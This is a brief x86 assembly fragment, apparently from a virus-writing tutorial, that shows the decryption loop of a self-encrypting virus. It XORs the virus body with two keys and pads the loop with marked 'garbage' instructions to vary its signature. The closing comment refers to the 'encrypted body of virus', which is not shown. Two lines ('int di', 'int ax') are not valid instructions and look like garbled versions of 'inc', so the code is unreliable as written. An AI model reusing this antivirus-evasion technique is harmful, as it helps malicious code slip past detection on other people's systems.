; decryption version_4


inc si ;optional, garbage
mov ax,0E9B ;key 1
clc ;garbage
mov di,012A ;Start offset
nop
mov cx,0571 ;key 2

Decrypt:
xor [di],cx ;decryption
sub bx,dx ;garbage
xor bx,cx         ;garbage
sub bx,ax       ;garbage
nop
xor dx,cx               ;garbage
xor [di],ax ;decryption

int di
nop
clc
int ax
loop Decrypt

Start:
 ;encrypted.decrypted body of virus